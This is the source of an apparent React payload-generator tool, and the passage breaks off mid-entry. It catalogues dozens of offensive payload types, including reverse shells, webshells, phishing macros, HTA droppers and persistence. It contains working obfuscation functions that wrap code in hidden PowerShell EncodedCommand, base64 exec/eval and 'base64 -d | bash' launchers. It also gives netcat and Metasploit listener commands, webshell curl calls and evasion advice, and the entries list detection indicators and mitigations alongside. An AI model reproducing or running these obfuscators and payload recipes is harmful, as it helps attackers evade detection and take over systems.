import React, { useState, useEffect, useMemo, useRef } from 'react';
import {
  Swords, Copy, Download, Zap, Code, Eye, EyeOff, Shield, Target,
  Globe, Server, Wifi, BookOpen, Play, ChevronDown, ChevronUp, Lightbulb,
  AlertCircle, CheckCircle, Layers, FileCode, Lock, Unlock, Terminal,
  Network, GitMerge, Database, Hash, Activity, ShieldAlert, Key, Plus, Clock,
  Hammer, GraduationCap, Award, Cpu, Cloud, Braces,
  Scan, ExternalLink, Star
} from 'lucide-react';

// ─── Types ────────────────────────────────────────────────
type PayloadType =
  | 'reverse_shell'
  | 'meterpreter'
  | 'bind_shell'
  | 'webshell'
  | 'dll_inject'
  | 'shellcode'
  | 'macro'
  | 'hta'
  | 'reverse_https'
  | 'reverse_http'
  | 'bind_https'
  | 'java_webshell'
  | 'aspx_webshell'
  | 'encrypted_shell'
  | 'powershell_encoded'
  | 'csharp_loader'
  | 'dns_shell'
  | 'icmp_shell'
  | 'smb_shell'
  | 'ssh_shell'
  | 'powershell_plain'
  | 'bash_reverse'
  | 'wmi_shell'
  | 'winrm_shell'
  | 'cobalt_strike_beacon'
  | 'sliver_beacon'
  | 'macos_reverse'
  | 'msbuild_applocker_bypass'
  | 'regsvr32_squiblydoo'
  | 'certutil_downloader'
  | 'excel4_macro'
  | 'dde_injection'
  | 'donut_shellcode'
  | 'com_hijack'
  | 'task_scheduler_persistence'
  | 'registry_persistence'
  | 'service_persistence'
  | 'aws_ec2_reverse'
  | 'gcp_compute_reverse'
  | 'azure_vm_reverse'
  | 'docker_reverse'
  | 'kubernetes_exec'
  | 'python_websocket_shell'
  | 'rust_reverse';

type OutputFormat =
  | 'powershell'
  | 'csharp'
  | 'python'
  | 'go'
  | 'raw_c'
  | 'vba'
  | 'javascript'
  | 'php'
  | 'jsp'
  | 'aspx'
  | 'bash'
  | 'perl'
  | 'ruby'
  | 'batch'
  | 'hta'
  | 'xml'
  | 'inf'
  | 'rust';

type ObfuscationLevel = 'none' | 'light' | 'medium' | 'heavy';

// ─── Interfaces ────────────────────────────────────────────
interface PayloadInfo {
  type: PayloadType;
  name: string;
  category: string;
  description: string;
  whatItDoes: string;
  howToUse: string;
  whereToUse: string;
  pros: string[];
  cons: string[];
  icon: React.ReactNode;
  color: string;
  defaultPort: number;
  requiresLhost: boolean;
  requiresLport: boolean;
  supportedFormats: OutputFormat[];
  howItWorks: string;
  exampleScenario: string;
  commonListenerCommand: string;
  detectionIndicators: string[];
  mitigationTips: string[];
  references: string[];
  isComplete: boolean;
  labVsReal: string;
  detectionComplexity: 'Low' | 'Medium' | 'High';
  stealthRating: 'Low' | 'Medium' | 'High';
  reliabilityRating: 'Low' | 'Medium' | 'High';
}

// ─── Constants ─────────────────────────────────────────────
const FORMAT_EXTENSIONS: Partial<Record<OutputFormat, string>> = {
  powershell: 'ps1',
  csharp: 'cs',
  python: 'py',
  go: 'go',
  raw_c: 'c',
  vba: 'bas',
  javascript: 'js',
  php: 'php',
  jsp: 'jsp',
  aspx: 'aspx',
  bash: 'sh',
  perl: 'pl',
  ruby: 'rb',
  batch: 'bat',
  hta: 'hta',
  xml: 'xml',
  inf: 'inf',
  rust: 'rs',
};

const FORMAT_MIMES: Partial<Record<OutputFormat, string>> = {
  python: 'text/x-python',
  powershell: 'application/octet-stream',
  bash: 'text/x-shellscript',
  csharp: 'text/x-csharp',
  javascript: 'text/javascript',
  php: 'text/x-php',
  jsp: 'application/x-jsp',
  aspx: 'text/x-aspx',
  perl: 'text/x-perl',
  ruby: 'text/x-ruby',
  vba: 'text/x-vba',
  batch: 'text/x-batch',
  hta: 'text/html',
  xml: 'text/xml',
  go: 'text/x-go',
  raw_c: 'text/x-c',
  inf: 'text/plain',
  rust: 'text/x-rust',
};

const OBFUSCATION_SUPPORTED_FORMATS: OutputFormat[] = [
  'powershell', 'python', 'csharp', 'javascript', 'bash', 'perl', 'ruby',
];
const STORAGE_KEY = 'payloadforge_config_v2';

type TimerHandle = ReturnType<typeof setTimeout>;

// ─── Obfuscation Helpers ──────────────────────────────────
function utf8ToBase64(str: string): string {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function utf16LeToBase64(str: string): string {
  const bytes = new Uint8Array(str.length * 2);
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    bytes[i * 2] = c & 0xff;
    bytes[i * 2 + 1] = c >> 8;
  }
  let binary = '';
  for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
  return btoa(binary);
}

function obfuscatePowerShell(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code;

  if (level === 'light') {
    const body = code.replace(/^\/\/.*$/gm, '').trim();
    const b64 = utf16LeToBase64(body);
    return `powershell -NoP -NonI -W Hidden -EncodedCommand ${b64}`;
  }

  if (level === 'medium') {
    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`);
    const charArray = chars.join('+');
    return `$code = ${charArray}; IEX $code`;
  }

  if (level === 'heavy') {
    const chars = code.split('').map(c => `[char]${c.charCodeAt(0)}`);
    const charArray = chars.join('+');
    const funcName = '_' + Math.random().toString(36).substring(2, 10);
    return `function ${funcName} { $code = ${charArray}; IEX $code }; ${funcName}`;
  }

  return code;
}

function obfuscatePython(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code;

  if (level === 'light') {
    const b64 = utf8ToBase64(code);
    return `import base64;exec(base64.b64decode("${b64}").decode())`;
  }

  if (level === 'medium') {
    const chars = code.split('').map(c => `chr(${c.charCodeAt(0)})`);
    return `exec(''.join([${chars.join(',')}]))`;
  }

  if (level === 'heavy') {
    const chunkSize = 32;
    const chunks: string[] = [];
    for (let i = 0; i < code.length; i += chunkSize) {
      chunks.push(code.slice(i, i + chunkSize));
    }
    const xorKey = Math.floor(Math.random() * 255) + 1;
    const encoded = chunks.map((chunk) =>
      Array.from(chunk).map(ch => `(chr(${ch.charCodeAt(0) ^ xorKey}))`).join(',')
    );
    const varName = '_' + Math.random().toString(36).slice(2, 10);
    const extendLines = encoded.map((c) => `${varName}.extend([${c}])`).join('\n');
    return `
${varName} = []
${extendLines}
exec(''.join(chr((ord(c) ^ ${xorKey})) for c in ''.join(${varName})))
`;
  }

  return code;
}

function obfuscateCSharp(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code;
  if (level === 'light') {
    return `// C# obfuscation: use ConfuserEx or similar tools for production\n${code}`;
  }
  return `// C# obfuscation: use ConfuserEx, Agile.NET, or similar\n${code}`;
}

function obfuscateJavaScript(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code;

  if (level === 'light') {
    const b64 = utf8ToBase64(code);
    return `eval(atob("${b64}"))`;
  }

  if (level === 'medium') {
    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`);
    return `eval(${chars.join('+')})`;
  }

  if (level === 'heavy') {
    const chars = code.split('').map(c => `String.fromCharCode(${c.charCodeAt(0)})`);
    const fnName = '_' + Math.random().toString(36).slice(2, 10);
    return `(function ${fnName}(){var s=${chars.join('+')}; eval(s);})();`;
  }

  return code;
}

function obfuscateBash(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code;
  const b64 = utf8ToBase64(code);
  return `echo "${b64}" | base64 -d | bash`;
}

function obfuscatePerl(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code;
  const b64 = utf8ToBase64(code);
  return `echo "${b64}" | base64 -d | perl`;
}

function obfuscateRuby(code: string, level: ObfuscationLevel): string {
  if (level === 'none') return code;
  const b64 = utf8ToBase64(code);
  return `echo "${b64}" | base64 -d | ruby`;
}

function obfuscateCode(
  code: string,
  format: OutputFormat,
  level: ObfuscationLevel
): string {
  if (level === 'none') return code;

  if (!OBFUSCATION_SUPPORTED_FORMATS.includes(format)) {
    return code;
  }

  switch (format) {
    case 'powershell':
      return obfuscatePowerShell(code, level);
    case 'python':
      return obfuscatePython(code, level);
    case 'csharp':
      return obfuscateCSharp(code, level);
    case 'javascript':
      return obfuscateJavaScript(code, level);
    case 'bash':
      return obfuscateBash(code, level);
    case 'perl':
      return obfuscatePerl(code, level);
    case 'ruby':
      return obfuscateRuby(code, level);
    default:
      return code;
  }
}

function renderReferences(references: string[]) {
  return references.map((ref, i) => (
    <li key={i}>
      <a
        href={ref}
        target="_blank"
        rel="noopener noreferrer"
        className="text-cyan-400 hover:underline break-all text-xs"
      >
        {ref}
      </a>
    </li>
  ));
}

function substituteListener(command: string, lhost: string, lport: number): string {
  return command
    .replace(/\$\{lhost\}/gi, lhost)
    .replace(/\$\{lport\}/gi, String(lport))
    .replace(/\$LHOST\b/gi, lhost)
    .replace(/\$LPORT\b/gi, String(lport))
    .replace(/\$lhost\b/gi, lhost)
    .replace(/\$lport\b/gi, String(lport));
}

// ─── Encyclopedia ──────────────────────────────────────────
const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
  // 1. Reverse Shell
  {
    type: 'reverse_shell',
    name: 'Reverse Shell',
    category: 'Reverse Shells',
    description: 'The target connects back to your listener — the classic lab staple.',
    whatItDoes: 'Opens a connection from the compromised machine back to your attacking machine, giving you a command shell.',
    howToUse: 'Start a listener (nc -lvnp ${lport}), generate the payload, execute it on the target.',
    whereToUse: 'Internal networks, after initial access, when outbound connections are allowed.',
    pros: ['Very reliable', 'Works through firewalls (outbound)', 'Easy to set up', 'Works on almost all platforms'],
    cons: ['Requires outbound access from target', 'Can be blocked by strict egress filtering', 'Plaintext traffic'],
    icon: <Wifi size={18} />,
    color: 'text-emerald-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['powershell', 'python', 'go', 'raw_c', 'csharp', 'bash', 'perl', 'ruby', 'rust'],
    howItWorks: 'Opens a TCP socket to LHOST:LPORT, duplicates descriptors, spawns a shell.',
    exampleScenario: 'Upload a reverse shell script to a web server to get a shell back.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Outbound connections to unusual ports',
      'Process spawning cmd.exe or /bin/sh with network activity',
      'Anomalous parent-child process relationships',
    ],
    mitigationTips: [
      'Implement strict egress filtering',
      'Monitor for suspicious outbound connections',
      'Enable PowerShell logging',
    ],
    references: ['https://attack.mitre.org/techniques/T1071/', 'https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'],
    isComplete: true,
    labVsReal: 'In a lab, this is the go-to for quick access. In real red team ops, it\'s often used as a fallback when more stealthy C2 channels fail. Plaintext versions are rarely used in mature engagements.',
    detectionComplexity: 'Low',
    stealthRating: 'Low',
    reliabilityRating: 'High',
  },
  // 2. Meterpreter
  {
    type: 'meterpreter',
    name: 'Meterpreter',
    category: 'C2 Frameworks',
    description: 'Metasploit\'s advanced payload with powerful post‑exploitation features.',
    whatItDoes: 'Provides an advanced interactive shell with built‑in commands for privilege escalation, pivoting, file transfer, keylogging, etc.',
    howToUse: 'Use with Metasploit handler. Generate payload → execute on target → interact via msfconsole.',
    whereToUse: 'When you need advanced post‑exploitation capabilities.',
    pros: ['Extremely powerful post‑exploitation', 'Built‑in modules', 'Session management', 'Great for pivoting'],
    cons: ['Larger footprint', 'Easier to detect than simple shells', 'Requires Metasploit', 'Heavily signatured'],
    icon: <Layers size={18} />,
    color: 'text-cyan-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'python', 'powershell'],
    howItWorks: 'Runs entirely in memory (reflective DLL injection) with an encrypted protocol. Provides extensions for file system, registry, process migration, keylogging, etc.',
    exampleScenario: 'Use Meterpreter to gain a foothold, then pivot to other machines using built‑in port forwarding.',
    commonListenerCommand: 'msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; exploit"',
    detectionIndicators: [
      'Unusual process injection (reflective DLL loading)',
      'Encrypted network traffic over non‑standard ports',
      'Presence of known Meterpreter extensions',
    ],
    mitigationTips: [
      'Enable Windows Defender Application Guard and Controlled Folder Access',
      'Monitor for suspicious named pipes or mutexes',
      'Use EDR with behavioral detection',
    ],
    references: ['https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/', 'https://attack.mitre.org/software/S0184/'],
    isComplete: false,
    labVsReal: 'Meterpreter is heavily used in CTF and training. In real red teams, it\'s often replaced by custom C2 (like Cobalt Strike) due to its heavy signature footprint, though it still appears in some engagements.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 3. Bind Shell
  {
    type: 'bind_shell',
    name: 'Bind Shell',
    category: 'Bind Shells',
    description: 'Opens a listening port on the target for you to connect to.',
    whatItDoes: 'Listens on a port; you connect to it to get a shell.',
    howToUse: 'Generate and run on target. Then connect from your machine using netcat.',
    whereToUse: 'When outbound is restricted but inbound is possible.',
    pros: ['No outbound from target needed', 'Good when egress is blocked'],
    cons: ['Requires inbound access to target', 'Often blocked by firewalls', 'Less common'],
    icon: <Server size={18} />,
    color: 'text-amber-400',
    defaultPort: 4444,
    requiresLhost: false,
    requiresLport: true,
    supportedFormats: ['powershell', 'csharp', 'raw_c', 'python', 'bash'],
    howItWorks: 'Binds to a port, waits for incoming connection, duplicates descriptors, spawns shell.',
    exampleScenario: 'Deploy a bind shell in a segmented network where you can reach the target directly via VPN.',
    commonListenerCommand: 'nc <target-ip> ${lport}',
    detectionIndicators: [
      'Listening ports that are not typical for the system',
      'Processes listening on ports and spawning child processes',
    ],
    mitigationTips: [
      'Block inbound connections from untrusted networks',
      'Use host‑based firewalls to restrict listening ports',
      'Monitor for anomalous port binding using Sysmon',
    ],
    references: ['https://attack.mitre.org/techniques/T1071/'],
    isComplete: true,
    labVsReal: 'Bind shells are great in labs where you have direct network access. In real engagements, they\'re less common because inbound connections are heavily monitored and firewalled.',
    detectionComplexity: 'Low',
    stealthRating: 'Low',
    reliabilityRating: 'Medium',
  },
  // 4. WebShell
  {
    type: 'webshell',
    name: 'WebShell',
    category: 'Web Shells',
    description: 'A web‑based shell uploaded to a web server — the ultimate persistence tool.',
    whatItDoes: 'A script that allows remote command execution via a web browser or curl.',
    howToUse: 'Upload to a vulnerable web application, then access via URL with parameters.',
    whereToUse: 'After finding file upload vulnerabilities, web app exploitation, or for persistence.',
    pros: ['Works through web ports (80/443)', 'Easy to access', 'Good for maintaining access'],
    cons: ['Can be easily detected', 'Usually requires web server access first', 'Less stealthy'],
    icon: <Globe size={18} />,
    color: 'text-purple-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['php', 'javascript', 'python', 'jsp', 'aspx'],
    howItWorks: 'Small script that accepts a command parameter via GET/POST and executes it on the server.',
    exampleScenario: 'Upload a PHP webshell to a WordPress site and run system commands.',
    commonListenerCommand: 'curl -X GET "http://target/webshell.php?cmd=id"',
    detectionIndicators: [
      'Suspicious scripts in web directories',
      'Unusual parameters (cmd, exec, system) in web logs',
      'Outbound connections from web server processes',
    ],
    mitigationTips: [
      'Disable unnecessary file uploads and restrict allowed file types',
      'Monitor web server logs for anomalous requests',
      'Use Web Application Firewalls (WAF)',
    ],
    references: ['https://attack.mitre.org/techniques/T1505/'],
    isComplete: true,
    labVsReal: 'WebShells are frequently used in both labs and real engagements. In real red teams, they\'re often used as a persistence mechanism after initial compromise, sometimes obfuscated to evade WAFs.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 5. DLL Injection
  {
    type: 'dll_inject',
    name: 'DLL Injection',
    category: 'AppLocker / EDR Bypass',
    description: 'Injects malicious code into a running process — stealthy and powerful.',
    whatItDoes: 'Loads a malicious DLL into the memory of another process to execute code.',
    howToUse: 'Generate DLL → Use injection technique (Process Hollowing, Reflective DLL Injection, etc.) to load it.',
    whereToUse: 'Advanced persistence, process migration, evading detection.',
    pros: ['Stealthy (lives in legitimate process)', 'Good for persistence', 'Can bypass some AV'],
    cons: ['More complex to use', 'Requires finding a target process', 'Higher chance of crashing processes'],
    icon: <Layers size={18} />,
    color: 'text-rose-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['csharp', 'raw_c'],
    howItWorks: 'Uses API calls like VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread to allocate memory, write the DLL, and execute it in the target process.',
    exampleScenario: 'Inject a Meterpreter DLL into explorer.exe to hide your presence.',
    commonListenerCommand: 'nc -lvnp ${lport} (if the DLL connects back)',
    detectionIndicators: [
      'Unusual API calls (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)',
      'DLLs loaded from non‑standard paths',
      'Process injection events (e.g., Sysmon event 8)',
    ],
    mitigationTips: [
      'Enable Process Mitigation Policies',
      'Monitor for cross‑process memory writes',
      'Use EDR with memory scanning',
    ],
    references: ['https://attack.mitre.org/techniques/T1055/'],
    isComplete: false,
    labVsReal: 'DLL injection is a staple in advanced labs and real red team operations. In real engagements, it\'s often combined with other techniques like process hollowing to evade EDR.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'Medium',
  },
  // 6. Shellcode
  {
    type: 'shellcode',
    name: 'Shellcode',
    category: 'AppLocker / EDR Bypass',
    description: 'Raw machine code that can be injected or used in exploits.',
    whatItDoes: 'Small piece of machine code that performs actions (usually spawns a shell or connects back).',
    howToUse: 'Generate shellcode → Embed it into an exploit, loader, or inject it into a process.',
    whereToUse: 'Exploit development, custom loaders, when you need minimal size payloads.',
    pros: ['Very small size', 'Highly flexible', 'Can be used in many contexts'],
    cons: ['Requires knowledge of memory corruption', 'Architecture specific', 'Harder to debug'],
    icon: <Code size={18} />,
    color: 'text-indigo-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['raw_c', 'python', 'go', 'rust'],
    howItWorks: 'Position‑independent byte sequence that, when executed, performs a specific action (spawns a shell or connects back).',
    exampleScenario: 'Use shellcode as payload in a buffer overflow exploit to get a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'Memory regions with R/W/X permissions',
      'Suspicious shellcode patterns (long NOP sleds)',
      'Anomalous execution flow from known exploited applications',
    ],
    mitigationTips: [
      'Enable ASLR, DEP, and Control Flow Guard',
      'Harden applications against memory corruption',
      'Use exploit mitigation tools',
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: false,
    labVsReal: 'Shellcode is the foundation of many exploits in both labs and real engagements. In real red teams, it\'s often used in custom loaders to avoid signature detection.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'Medium',
  },
  // 7. Macro
  {
    type: 'macro',
    name: 'Macro (VBA)',
    category: 'Initial Access / Phishing',
    description: 'Malicious macro embedded in Office documents — the classic phishing vector.',
    whatItDoes: 'When the victim enables macros, it executes code to download and run a payload.',
    howToUse: 'Generate macro → Embed in Office document → Send via phishing email.',
    whereToUse: 'Phishing campaigns, initial access operations.',
    pros: ['Very effective for initial access', 'Social engineering friendly'],
    cons: ['Users are trained to disable macros', 'Modern Office has protections', 'Requires user interaction'],
    icon: <FileCode size={18} />,
    color: 'text-orange-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['vba'],
    howItWorks: 'VBA macro uses WScript.Shell or Shell to execute commands, often downloading a second‑stage payload.',
    exampleScenario: 'Phishing email with Excel spreadsheet containing macro that downloads a reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport} (for the downloaded payload)',
    detectionIndicators: [
      'Office processes spawning cmd.exe or powershell.exe',
      'Office files with suspicious macros (AutoOpen)',
      'Unusual network connections from Office applications',
    ],
    mitigationTips: [
      'Disable macros by default in Office (Group Policy)',
      'Use Office 365 advanced threat protection',
      'Educate users about enabling macros only from trusted sources',
    ],
    references: ['https://attack.mitre.org/techniques/T1059/'],
    isComplete: false,
    labVsReal: 'Macros are a classic lab and real-world initial access vector. Real red teams often use them in the early stages of a campaign, though modern EDR has made them harder to execute successfully.',
    detectionComplexity: 'Medium',
    stealthRating: 'Low',
    reliabilityRating: 'Medium',
  },
  // 8. HTA
  {
    type: 'hta',
    name: 'HTA Application',
    category: 'Initial Access / Phishing',
    description: 'HTML Application that runs with full privileges when opened.',
    whatItDoes: 'Executes JavaScript/VBScript with high privileges to download and execute a payload.',
    howToUse: 'Generate HTA → Host it or send via email → Victim opens the file.',
    whereToUse: 'Phishing, when you need to execute code with high privileges.',
    pros: ['Runs with high privileges', 'Can be disguised as documents'],
    cons: ['Modern Windows has warnings', 'Requires user to open the file', 'Less commonly used now'],
    icon: <Globe size={18} />,
    color: 'text-red-400',
    defaultPort: 4444,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['javascript'],
    howItWorks: 'Processed by mshta.exe, runs script with user privileges, can launch processes, download files, execute commands.',
    exampleScenario: 'Craft an HTA file that looks like a PDF. Victim double‑clicks it, runs PowerShell to establish reverse shell.',
    commonListenerCommand: 'nc -lvnp ${lport}',
    detectionIndicators: [
      'mshta.exe spawning unusual child processes (cmd.exe, powershell.exe)',
      'Network connections from mshta.exe to remote IPs',
      'HTA files with obfuscated JavaScript',
    ],
    mitigationTips: [
      'Block mshta.exe from running via AppLocker or WDAC',
      'Monitor mshta.exe child process creation',
      'Consider disabling HTA functionality if not needed',
    ],
    references: ['https://attack.mitre.org/techniques/T1218/'],
    isComplete: false,
    labVsReal: 'HTA is a common lab technique and still appears in real phishing campaigns, though it\'s increasingly detected by modern EDR.',
    detectionComplexity: 'Medium',
    stealthRating: 'Low',
    reliabilityRating: 'Medium',
  },
  // 9. Reverse HTTPS
  {
    type: 'reverse_https',
    name: 'Reverse HTTPS',
    category: 'Reverse Shells',
    description: 'Reverse shell over HTTPS, encrypted traffic to evade detection.',
    whatItDoes: 'Establishes an encrypted connection from the target to your HTTPS server, providing a shell.',
    howToUse: 'Set up an HTTPS listener (e.g., using openssl or Metasploit), generate the payload, run it on the target.',
    whereToUse: 'When you need to blend in with normal HTTPS traffic and avoid detection by IDS/IPS.',
    pros: ['Encrypted traffic', 'Can bypass many security appliances', 'Looks like normal web traffic'],
    cons: ['Requires SSL certificate', 'Slightly larger payload', 'Listener is more complex to set up'],
    icon: <Lock size={18} />,
    color: 'text-blue-400',
    defaultPort: 443,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'powershell', 'go', 'csharp'],
    howItWorks: 'Uses HTTPS (SSL/TLS) to wrap the reverse shell communication, making it harder to inspect and detect.',
    exampleScenario: 'During a red team assessment, you use a reverse HTTPS shell to blend in with web traffic and avoid detection by network monitoring.',
    commonListenerCommand: 'metasploit with PAYLOAD windows/x64/meterpreter/reverse_https LHOST=${lhost} LPORT=${lport}',
    detectionIndicators: [
      'Outbound connections to unusual HTTPS destinations',
      'TLS certificate anomalies',
      'Processes initiating HTTPS connections and spawning shells',
    ],
    mitigationTips: [
      'Implement SSL/TLS decryption at the perimeter',
      'Monitor for anomalous HTTPS traffic patterns',
      'Use application‑layer firewalls to inspect HTTPS payloads',
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false,
    labVsReal: 'Reverse HTTPS is heavily used in both labs and real engagements. Real red teams often use it as a primary C2 channel due to its ability to blend in with normal traffic.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'High',
  },
  // 10. Reverse HTTP
  {
    type: 'reverse_http',
    name: 'Reverse HTTP',
    category: 'Reverse Shells',
    description: 'Reverse shell over plain HTTP, works through proxies.',
    whatItDoes: 'Connects back to an HTTP server, often using GET/POST requests for command and control.',
    howToUse: 'Set up an HTTP listener, generate the payload, execute on target.',
    whereToUse: 'When HTTPS is blocked or you need to go through web proxies.',
    pros: ['Works through most proxies', 'Easy to set up', 'Can be disguised as API calls'],
    cons: ['Plaintext traffic (easily sniffed)', 'More likely to be detected than HTTPS'],
    icon: <Globe size={18} />,
    color: 'text-sky-400',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: true,
    supportedFormats: ['python', 'powershell', 'go'],
    howItWorks: 'Uses HTTP protocol to send and receive commands, often with base64 encoding or simple parameter passing.',
    exampleScenario: 'Use a reverse HTTP shell to communicate with a C2 server that mimics a legitimate API to avoid suspicion.',
    commonListenerCommand: 'python -m http.server ${lport} (with custom handler)',
    detectionIndicators: [
      'Frequent GET/POST requests with unusual user‑agents or payload patterns',
      'Large outbound HTTP requests',
      'Processes generating HTTP traffic and spawning shells',
    ],
    mitigationTips: [
      'Inspect HTTP traffic for suspicious parameters and headers',
      'Implement egress filtering to limit outbound HTTP to known destinations',
      'Use web proxies with threat intelligence feeds',
    ],
    references: ['https://attack.mitre.org/techniques/T1071.001/'],
    isComplete: false,
    labVsReal: 'Reverse HTTP is common in labs. In real engagements, it\'s less used due to its plaintext nature, but can be effective in environments with deep HTTPS inspection that breaks SSL.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 11. Bind HTTPS
  {
    type: 'bind_https',
    name: 'Bind HTTPS',
    category: 'Bind Shells',
    description: 'Bind shell over HTTPS, encrypted incoming connections.',
    whatItDoes: 'Listens on a port with SSL/TLS encryption, waiting for you to connect securely.',
    howToUse: 'Generate payload, run on target, then connect using an HTTPS client (e.g., openssl s_client) or Metasploit.',
    whereToUse: 'When you need an encrypted bind shell for stealth.',
    pros: ['Encrypted traffic', 'No outbound from target', 'Harder to detect'],
    cons: ['Requires SSL setup', 'Listener must support SSL', 'Incoming connections may be blocked'],
    icon: <Unlock size={18} />,
    color: 'text-indigo-400',
    defaultPort: 443,
    requiresLhost: false,
    requiresLport: true,
    supportedFormats: ['csharp', 'python'],
    howItWorks: 'Binds to a port with SSL/TLS, waits for an encrypted incoming connection, then provides a shell.',
    exampleScenario: 'Deploy a bind HTTPS shell on a server that you can reach directly, ensuring the traffic is encrypted.',
    commonListenerCommand: 'openssl s_client -connect ${lhost}:${lport}',
    detectionIndicators: [
      'Listening ports with SSL/TLS certificates',
      'Unusual certificate fingerprints',
      'Processes listening on non‑standard ports with SSL',
    ],
    mitigationTips: [
      'Block inbound SSL connections to internal hosts',
      'Monitor for new TLS certificates on internal servers',
      'Use host‑based firewalls to restrict listening ports',
    ],
    references: ['https://attack.mitre.org/techniques/T1572/'],
    isComplete: false,
    labVsReal: 'Bind HTTPS is rarely used in real engagements due to the difficulty of inbound connections, but appears in labs where network segmentation is less strict.',
    detectionComplexity: 'High',
    stealthRating: 'High',
    reliabilityRating: 'Low',
  },
  // 12. Java WebShell
  {
    type: 'java_webshell',
    name: 'Java WebShell (JSP)',
    category: 'Web Shells',
    description: 'WebShell written in JSP for Java‑based web applications.',
    whatItDoes: 'Accepts commands via HTTP and executes them on the JVM, returning the output.',
    howToUse: 'Upload the JSP file to a Java web application (e.g., Tomcat, JBoss) and access it via URL.',
    whereToUse: 'After exploiting a Java web application, when you need a web‑based backdoor.',
    pros: ['Works on Java platforms', 'Can be used with common Java servlet containers', 'Good for persistence'],
    cons: ['Requires Java runtime', 'Limited to JVM commands', 'May be detected by WAF'],
    icon: <Server size={18} />,
    color: 'text-orange-300',
    defaultPort: 8080,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['jsp'],
    howItWorks: 'Uses JSP scriptlets to execute system commands using Runtime.exec() and returns the output via HTTP.',
    exampleScenario: 'Upload a JSP webshell to a vulnerable Tomcat server to maintain access.',
    commonListenerCommand: 'curl -X GET "http://target:8080/shell.jsp?cmd=id"',
    detectionIndicators: [
      'JSP files in web directories with suspicious content',
      'Requests with cmd parameter pointing to JSP files',
      'Tomcat/JVM processes spawning child processes',
    ],
    mitigationTips: [
      'Harden web application servers (restrict file uploads)',
      'Monitor web application logs for suspicious requests',
      'Use WAF to block known JSP webshell signatures',
    ],
    references: ['https://attack.mitre.org/techniques/T1505.003/'],
    isComplete: true,
    labVsReal: 'JSP webshells are common in both labs and real engagements targeting Java-based applications. Real red teams often use them for persistence in enterprise Java environments.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 13. ASPX WebShell
  {
    type: 'aspx_webshell',
    name: 'ASP.NET WebShell (ASPX)',
    category: 'Web Shells',
    description: 'WebShell written in ASP.NET for Windows IIS servers.',
    whatItDoes: 'Executes commands via HTTP using .NET Process class, returning output.',
    howToUse: 'Upload the ASPX file to an IIS web application and access it.',
    whereToUse: 'After exploiting a Windows web server, for a web‑based backdoor.',
    pros: ['Works on IIS', 'Leverages .NET framework', 'Can be made stealthy'],
    cons: ['Requires .NET', 'May be blocked by application pools', 'Visible in logs'],
    icon: <Server size={18} />,
    color: 'text-purple-300',
    defaultPort: 80,
    requiresLhost: true,
    requiresLport: false,
    supportedFormats: ['aspx'],
    howItWorks: 'Uses the Process class in .NET to run commands and write the output to the HTTP response.',
    exampleScenario: 'Upload an ASPX webshell to a SharePoint server to get command execution.',
    commonListenerCommand: 'curl "http://target/shell.aspx?cmd=whoami"',
    detectionIndicators: [
      'ASPX files with suspicious code in web directories',
      'Unusual parameters in HTTP requests to ASPX files',
      'IIS worker processes spawning child processes',
    ],
    mitigationTips: [
      'Restrict file uploads in IIS',
      'Monitor IIS logs for anomalous requests',
      'Use WAF with .NET‑specific rules',
    ],
    references: ['https://attack.mitre.org/techniques/T1505.003/'],
    isComplete: true,
    labVsReal: 'ASPX webshells are common in Windows-centric enterprise environments. Real red teams frequently use them for persistence on IIS servers.',
    detectionComplexity: 'Medium',
    stealthRating: 'Medium',
    reliabilityRating: 'High',
  },
  // 14. Encrypted Shell
  {
    type: 'encrypted_shell',
    name: 'Encrypted Reverse Shell',
    category: 'Reverse Shells',
    description: 'Reverse shell with custom encryption to evade signature detection.',
